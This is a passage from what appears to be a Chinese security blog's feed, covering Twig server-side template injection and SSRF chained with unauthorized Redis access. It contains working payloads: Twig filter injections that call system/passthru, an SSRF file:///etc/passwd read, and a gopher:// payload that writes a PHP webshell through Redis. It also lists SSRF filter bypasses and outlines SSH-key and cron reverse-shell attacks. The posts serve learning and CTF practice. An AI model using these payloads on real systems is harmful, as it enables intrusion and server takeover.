  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">\CallbackFilterIterator</span>(<span class="keyword">new</span> <span class="title class_">\IteratorIterator</span>(<span class="variable">$array</span>), <span class="variable">$arrow</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​根据源码可得，<code>$array</code> 和 <code>$arrow</code> 将作为参数直接传递给 <code>array_filter()</code> 函数。该函数可以使用回调函数过滤数组中的元素。如果我们自定义一个恶意的回调函数，可能会导致代码执行或命令执行等安全问题。</p><p>​array_filter() 函数用回调函数过滤数组中的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="keyword">array</span>,callbackfunction);</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><em>array</em></td><td align="center">必需。规定要过滤的数组。</td></tr><tr><td align="center"><em>callbackfunction</em></td><td align="center">必需。规定要使用的回调函数。</td></tr></tbody></table><p>​array可以作为<em>callbackfunction</em>得参数来执行。</p><p>​payload：</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;[<span class="string">&quot;calc&quot;</span>]<span class="punctuation">|</span><span class="keyword">filter</span>(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;[<span class="string">&quot;calc&quot;</span>]<span class="punctuation">|</span><span class="keyword">filter</span>(<span class="string">&quot;passthru&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure><h5 id="reduce-过滤器"><a href="#reduce-过滤器" class="headerlink" title="reduce 过滤器"></a>reduce 过滤器</h5><p>​<code>reduce</code> 过滤器使用箭头函数迭代地将序列或映射中的多个元素缩减为单个值。箭头函数接收上一次迭代的返回值和序列或映射的当前值，示例模板及PHP脚本如下：</p><h6 id="reduce-html-twig"><a href="#reduce-html-twig" class="headerlink" title="reduce.html.twig"></a><code>reduce.html.twig</code></h6><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">set</span> numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>] <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; numbers<span class="punctuation">|</span><span class="keyword">reduce</span>((carry, v) =&gt; carry + v) &#125;&#125;</span></span><br></pre></td></tr></table></figure><h6 id="reduce-php"><a href="#reduce-php" class="headerlink" title="reduce.php"></a><code>reduce.php</code></h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Loader\FilesystemLoader</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/templates&#x27;</span>);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 渲染模板</span></span><br><span class="line"><span class="variable">$template</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">load</span>(<span class="string">&#x27;reduce.html.twig&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$template</span>-&gt;<span class="title function_ invoke__">render</span>();</span><br></pre></td></tr></table></figure><p>​编译结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">twig_reduce_filter</span>(<span class="variable">$this</span>-&gt;env, <span class="variable">$context</span>[<span class="string">&quot;numbers&quot;</span>], function (<span class="variable">$carry</span>, <span class="variable">$v</span>) &#123; <span class="keyword">return</span> <span class="variable">$carry</span> + <span class="variable">$v</span>; &#125;);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h6 id="目录结构-2"><a href="#目录结构-2" class="headerlink" title="目录结构"></a>目录结构</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">your_project/</span><br><span class="line">├── templates/</span><br><span class="line">│   └── reduce.html.twig</span><br><span class="line">└── reduce.php</span><br></pre></td></tr></table></figure><p>​访问后你将得到如下输出：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure><h6 id="利用解析-2"><a href="#利用解析-2" class="headerlink" title="利用解析"></a>利用解析</h6><p>​我们发现和map过滤器一样，同样将输入的变量引导了twig_reduce_filter中，下面是reduce中有关twig_reduce_filter函数的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twig_reduce_filter</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$arrow</span>, <span class="variable">$initial</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!\<span class="title function_ invoke__">is_array</span>(<span class="variable">$array</span>)) &#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="title function_ invoke__">iterator_to_array</span>(<span class="variable">$array</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">array_reduce</span>(<span class="variable">$array</span>, <span class="variable">$arrow</span>, <span class="variable">$initial</span>);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​$array, $arrow 和 $initial 直接被 array_reduce 函数调用<code>array_reduce</code> 函数可以发送数组中的值到用户自定义函数，并返回一个字符串。如果我们自定义一个危险函数，将造成代码执行或命令执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|<span class="title function_ invoke__">reduce</span>(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;calc&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h5 id="sort-过滤器"><a href="#sort-过滤器" class="headerlink" title="sort 过滤器"></a>sort 过滤器</h5><p>作用，对数组进行排序，可以传递一个箭头函数来对数组进行排序，示例模板及PHP脚本如下：</p><h6 id="sort-html-twig"><a href="#sort-html-twig" class="headerlink" title="sort.html.twig"></a><code>sort.html.twig</code></h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set fruits = [</span><br><span class="line">    &#123; name: <span class="string">&#x27;Apples&#x27;</span>, quantity: <span class="number">5</span> &#125;,</span><br><span class="line">    &#123; name: <span class="string">&#x27;Oranges&#x27;</span>, quantity: <span class="number">2</span> &#125;,</span><br><span class="line">    &#123; name: <span class="string">&#x27;Grapes&#x27;</span>, quantity: <span class="number">4</span> &#125;,</span><br><span class="line">] %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> fruit in fruits|<span class="title function_ invoke__">sort</span>((a, b) =&gt; a.quantity &lt;=&gt; b.quantity)|<span class="title function_ invoke__">column</span>(<span class="string">&#x27;name&#x27;</span>) %&#125;</span><br><span class="line">    &#123;&#123; fruit &#125;&#125;</span><br><span class="line">&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure><h6 id="sort-php"><a href="#sort-php" class="headerlink" title="sort.php"></a><code>sort.php</code></h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Loader\FilesystemLoader</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/templates&#x27;</span>);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 渲染模板</span></span><br><span class="line"><span class="variable">$template</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">load</span>(<span class="string">&#x27;sort.html.twig&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$template</span>-&gt;<span class="title function_ invoke__">render</span>();</span><br></pre></td></tr></table></figure><p>​编译结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span>[<span class="string">&#x27;_parent&#x27;</span>] = <span class="variable">$context</span>;</span><br><span class="line"><span class="variable">$context</span>[<span class="string">&#x27;_seq&#x27;</span>] = <span class="title function_ invoke__">twig_ensure_traversable</span>(<span class="title function_ invoke__">twig_sort_filter</span>(<span class="variable">$this</span>-&gt;env, <span class="variable">$context</span>[<span class="string">&quot;fruits&quot;</span>], function (<span class="variable">$a</span>, <span class="variable">$b</span>) &#123; <span class="keyword">return</span> (<span class="variable">$a</span>[<span class="string">&quot;quantity&quot;</span>] &lt;=&gt; <span class="variable">$b</span>[<span class="string">&quot;quantity&quot;</span>]); &#125;));</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$context</span>[<span class="string">&#x27;_seq&#x27;</span>] <span class="keyword">as</span> <span class="variable">$context</span>[<span class="string">&quot;_key&quot;</span>] =&gt; <span class="variable">$context</span>[<span class="string">&quot;fruit&quot;</span>]) &#123;</span><br><span class="line">    <span class="comment">// column()过滤器将返回值为$name的fruit[&#x27;name&#x27;]并输出</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">twig_escape_filter</span>(<span class="variable">$this</span>-&gt;env, <span class="title function_ invoke__">twig_get_attribute</span>(<span class="variable">$this</span>-&gt;env, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getSourceContext</span>(), <span class="variable">$context</span>[<span class="string">&quot;fruit&quot;</span>], <span class="string">&quot;name&quot;</span>, [], <span class="string">&quot;array&quot;</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="number">13</span>), <span class="string">&quot;html&quot;</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="目录结构-3"><a href="#目录结构-3" class="headerlink" title="目录结构"></a>目录结构</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">your_project/</span><br><span class="line">├── templates/</span><br><span class="line">│   └── sort.html.twig</span><br><span class="line">└── sort.php</span><br></pre></td></tr></table></figure><h6 id="利用解析-3"><a href="#利用解析-3" class="headerlink" title="利用解析"></a>利用解析</h6><p>​我们可以注意到twig_sort_filter()这个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">twig_sort_filter</span>(<span class="variable">$this</span>-&gt;env, <span class="variable">$context</span>[<span class="string">&quot;fruits&quot;</span>], function (<span class="variable">$a</span>, <span class="variable">$b</span>) &#123; <span class="keyword">return</span> (<span class="variable">$a</span>[<span class="string">&quot;quantity&quot;</span>] &lt;=&gt; <span class="variable">$b</span>[<span class="string">&quot;quantity&quot;</span>]); &#125;)</span><br></pre></td></tr></table></figure><p>​下面是<code>sort</code>过滤器关于twig_sort_filter()函数的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twig_sort_filter</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$arrow</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$array</span> <span class="keyword">instanceof</span> \<span class="built_in">Traversable</span>) &#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="title function_ invoke__">iterator_to_array</span>(<span class="variable">$array</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!\<span class="title function_ invoke__">is_array</span>(<span class="variable">$array</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeError</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;The sort filter only works with arrays or &quot;Traversable&quot;, got &quot;%s&quot;.&#x27;</span>, \<span class="title function_ invoke__">gettype</span>(<span class="variable">$array</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> !== <span class="variable">$arrow</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">uasort</span>(<span class="variable">$array</span>, <span class="variable">$arrow</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">asort</span>(<span class="variable">$array</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​漏洞部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (<span class="literal">null</span> !== <span class="variable">$arrow</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">uasort</span>(<span class="variable">$array</span>, <span class="variable">$arrow</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​uasort() 函数使用用户自定义的比较函数对数组 $arr 中的元素按键值进行排序，在这段代码中，$array, $arrow这两个变量了同时可以使用用户自定义的比较函数对数组中的元素按键值进行排序，我们就可以传入包含函数参数的列表，进行命令执行了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;calc&quot;</span>, <span class="number">0</span>]|<span class="title function_ invoke__">sort</span>(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/news/9506">文章 - Twig 模板注入从零到一 - 先知社区</a></p><p><a href="https://xz.aliyun.com/news/11762">文章 - Twig模板引擎注入 - 先知社区</a></p><p><a href="https://forum.butian.net/share/2242">奇安信攻防社区-Twig 模板引擎注入详解</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> SSTI </tag>
            
            <tag> Twig </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF-Redis未授权访问利用</title>
      <link href="/2025/02/18/SSRF-redis/"/>
      <url>/2025/02/18/SSRF-redis/</url>
      
        <content type="html"><![CDATA[<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​在近期的几场比赛中，考察了SSRF的知识点，实践下来，发现我之前严重低估了SSRF的威力，所以决定写下这篇文章，简单梳理一下SSRF的漏洞原理及利用方法。</p><h3 id="什么是SSRF？"><a href="#什么是SSRF？" class="headerlink" title="什么是SSRF？"></a>什么是SSRF？</h3><p>​SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><h4 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h4><p>​SSRF产生的原因大多是由于服务器提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如：一个正常业务，期望用户传入的参数是这样的：<a href="https://example.com,假设服务器没有过滤file//%EF%BC%8C%E9%82%A3%E4%B9%88%E6%94%BB%E5%87%BB%E8%80%85%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8file%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8F%88%E6%88%96%E8%80%85%E8%AF%B4%EF%BC%8C%E6%B2%A1%E6%9C%89%E9%99%90%E5%88%B6%E7%94%A8%E6%88%B7%E4%BC%A0%E5%85%A5%E7%9A%84%E5%8F%82%E6%95%B0%E5%BF%85%E9%A1%BB%E5%8C%85%E5%90%ABexample%E8%BF%99%E4%B8%AA%E5%9F%9F%E5%90%8D%EF%BC%8C%E5%AE%9E%E9%99%85%E4%B8%8A%E5%A6%82%E6%9E%9C%E5%8F%AA%E9%99%90%E5%88%B6%E4%BA%86%E5%BF%85%E9%A1%BB%E5%8C%85%E5%90%ABexample%E8%BF%99%E4%B8%AA%E5%9F%9F%E5%90%8D%EF%BC%8C%E8%80%8C%E4%B8%8D%E9%99%90%E5%88%B6'..'%EF%BC%8C%E4%BB%8D%E7%84%B6%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8file%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E3%80%82">https://example.com，假设服务器没有过滤file://，那么攻击者就可以利用file伪协议访问本地文件，又或者说，没有限制用户传入的参数必须包含example这个域名，实际上如果只限制了必须包含example这个域名，而不限制&#39;..&#39;，仍然可以利用file伪协议访问本地文件。</a></p><p>​SSRF主要的攻击方式如下：</p><blockquote><ul><li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li><li>攻击运行在内网或本地的应用程序。</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)。</li><li>利用file协议读取本地文件等。</li></ul></blockquote><p>​PHP中漏洞产生的相关函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">fopen</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure><p>​Java中漏洞产生的相关函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">client.execute()</span><br><span class="line">httpclient.execute()</span><br></pre></td></tr></table></figure><h3 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h3><p>SSRF常用伪协议：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">##利用file协议查看本地文件</span><br><span class="line">file:// </span><br><span class="line">##利用dict探测端口</span><br><span class="line">dict://</span><br><span class="line">##利用gopher协议反弹shell</span><br><span class="line">gopher://</span><br></pre></td></tr></table></figure><h4 id="漏洞案例"><a href="#漏洞案例" class="headerlink" title="漏洞案例"></a>漏洞案例</h4><p>​为了更方便理解SSRF，这里选择PHP来演示SSRF ，创建一个PHP文件，键入如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​访问：<a href="http://127.0.0.1/SSRF.php?url=www.baidu.com">http://127.0.0.1/SSRF.php?url=www.baidu.com</a>，你将会看到如下页面：</p><p><img src="/img/SSRF-redis/image-20250112161912730-1739451911330-1.png" alt="image-20250112161912730"></p><p>​现在可确认这里是存在SSRF的，那么我们就可以尝试构造payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#访问本地文件</span><br><span class="line">http://127.0.0.1/SSRF.php?url=file:///etc/passwd</span><br><span class="line">#端口探测</span><br><span class="line">http://127.0.0.1/SSRF.php?url=dict://127.0.0.1:6379</span><br><span class="line">#假设存在redis未授权访问，且服务为PHP，则可用gopher写shell</span><br><span class="line">http://127.0.0.1/SSRF.php?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%247%0D%0A%0A%0Acmd%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure><p>​利用SSRF探测6379端口，发现存在redis服务。</p><p>​<img src="/img/SSRF-redis/image-20250112162700988-1739451911330-2.png" alt="image-20250112162700988"></p><p>​后续就可以使用前面所提供的payload进行写马操作，由于我是在Windows上运行的PHP所以这里不做演示。</p><h3 id="SSRF常用绕过方法"><a href="#SSRF常用绕过方法" class="headerlink" title="SSRF常用绕过方法"></a>SSRF常用绕过方法</h3><p>　1.@　　　　　　　　　　<a href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></p><p>　2.添加端口号　　　　　　<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p><p>　3.短地址　　　　　　　　<a href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a>    推荐：<a href="http://tool.chinaz.com/tools/dwz.aspx%E3%80%81https://dwz.cn/">http://tool.chinaz.com/tools/dwz.aspx、https://dwz.cn/</a></p><p>　4.可以指向任意ip的域名　 xip.io               原理是DNS解析。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1</p><p>　5.ip地址转换成进制来访问 192.168.0.1&#x3D;3232235521（十进制） </p><p>　6.非HTTP协议</p><p>　7.DNS Rebinding</p><p>　8.利用[::]绕过         http:&#x2F;&#x2F;[::]:80&#x2F; &gt;&gt;&gt; <a href="http://127.0.0.1/">http://127.0.0.1</a></p><p>　9.句号绕过         127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p><p>　10.利用302跳转绕过   使用<a href="https://tinyurl.com生成302跳转地址/">https://tinyurl.com生成302跳转地址</a></p><p>@：<a href="http://www.baidu.com@10.10.10.10/">http://www.baidu.com@10.10.10.10</a> 与 http?&#x2F;10.10.10.10 请求是相同的</p><h4 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h4><p>IP地址转换成十进制：</p><p>127.0.0.1 先转换为十六进制  7F000001 两位起步所以 1就是01</p><p>7F000001转换为二进制<br>127.0.0.1&#x3D;2130706433 最终结果</p><p>还有根据域名判断的，比如xip.io域名，就尝试如下方法</p><p><a href="http://xip.io/">xip.io</a><br><a href="http://xip.io127.0.0.1.xip.io/">xip.io127.0.0.1.xip.io</a> –&gt;127.0.0.1<br><a href="http://www.127.0.0.1.xip.io/">www.127.0.0.1.xip.io</a> –&gt;127.0.0.1<br><a href="http://haha.127.0.0.1.xip.io/">Haha.127.0.0.1.xip.io</a> –&gt;127.0.0.1<br><a href="http://haha.xixi.127.0.0.1.xip.io/">Haha.xixi.127.0.0.1.xip.io</a> –&gt;127.0.0.1</p><h4 id="常见限制"><a href="#常见限制" class="headerlink" title="常见限制"></a>常见限制</h4><p><strong>限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名</strong></p><p>采用http基本身份认证的方式绕过。即@<br><code>http://www.xxx.com@www.xxc.com</code></p><p><strong>限制请求IP不为内网地址</strong></p><p>当不允许ip为内网地址时<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p><p><strong>限制请求只为http协议</strong></p><p>（1）采取302跳转<br>（2）采取短地址</p><h3 id="SSRF防御建议"><a href="#SSRF防御建议" class="headerlink" title="SSRF防御建议"></a>SSRF防御建议</h3><blockquote><ul><li>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。</li><li>限制不能访问内网的IP，以防止对内网进行攻击。</li><li>屏蔽返回的详细信息。</li></ul></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​我们可以发现，SSRF的危害主要来自于本地文件的读取，以及暴露内网应用。而想要发挥SSRF最大的威力就需要搭配其他的漏洞，比如redis未授权访问或者fastcgi等扩大危害。</p><h2 id="Redis未授权攻击"><a href="#Redis未授权攻击" class="headerlink" title="Redis未授权攻击"></a>Redis未授权攻击</h2><blockquote><p>​Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源IP访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，所以Redis可以实现如下攻击操作。</p></blockquote><ol><li>如果是PHP服务器，或者支持解析JSP的Java服务器，那么就可以实现写Webshell操控服务器。</li><li>如果Redis服务器存在SSH服务，Redis服务器暴露在公网，并且运行Redis服务的用户拥有root权限，那么就可以在&#x2F;root&#x2F;.ssh文件夹的 authotrized_keys 文件中写入自己的ssh公钥，就可以使用对应私钥直接使用ssh服务登录服务器。</li><li>如果Redis服务器存在定时任务功能，那么就可以在定时任务路径中写入定时任务，执行命令行命令，就可以实现反弹shell，登陆服务器。</li></ol><h3 id="创建Redis服务"><a href="#创建Redis服务" class="headerlink" 